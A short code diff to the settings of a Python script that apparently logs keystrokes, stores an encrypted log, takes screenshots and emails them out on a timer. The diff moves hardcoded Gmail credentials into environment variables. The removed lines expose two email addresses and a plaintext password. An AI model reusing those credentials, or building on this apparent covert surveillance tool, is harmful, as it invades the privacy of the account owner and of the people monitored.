@@ -30,10 +30,9 @@ if platform.system() == 'Windows':
 LOG_FILE = "log.txt"
 ENCRYPTION_LOG_FILE = "encrypted_log.dat"
 SCREENSHOT_DIR = "screenshots"
-EMAIL_ADDRESS = "phanthienquang11223344@gmail.com"
-EMAIL_PASSWORD = "nxmdxrugkwqwrlgk"
-RECIPIENT_EMAIL = "phanthienquang11234@gmail.com"
-SMTP_SERVER = "smtp.gmail.com"
+EMAIL_ADDRESS = os.environ.get('MY_APP_EMAIL')
+EMAIL_PASSWORD = os.environ.get('MY_APP_PASSWORD')
+RECIPIENT_EMAIL = os.environ.get('MY_APP_RECEIVER')
 SMTP_PORT = 587
 SEND_INTERVAL = 3600
 SCREENSHOT_INTERVAL = 300
